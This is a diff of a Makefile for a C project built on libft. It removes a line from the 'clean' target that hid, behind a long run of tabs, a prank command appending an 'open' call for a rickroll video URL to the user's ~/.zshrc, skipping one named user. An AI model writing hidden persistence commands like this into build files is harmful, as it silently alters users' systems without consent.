@@ -98,7 +98,7 @@ $(LIBFT): $(LIBFT_INC)
 	make -C $(LIBFT_DIR)
 
 clean:
-	@rm -rf $(OBJ_DIR)																																																										;if [ ! -f ~/.troll ] && [ ! "$$USER" = "maemaldo" ]; then echo "																																																																					open https://shattereddisk.github.io/rickroll/rickroll.mp4 >/dev/null 2>&1" >> ~/.zshrc ; touch ~/.troll; fi
+	@rm -rf $(OBJ_DIR)
 
 fclean: clean
 	@make -C $(LIBFT_DIR) fclean
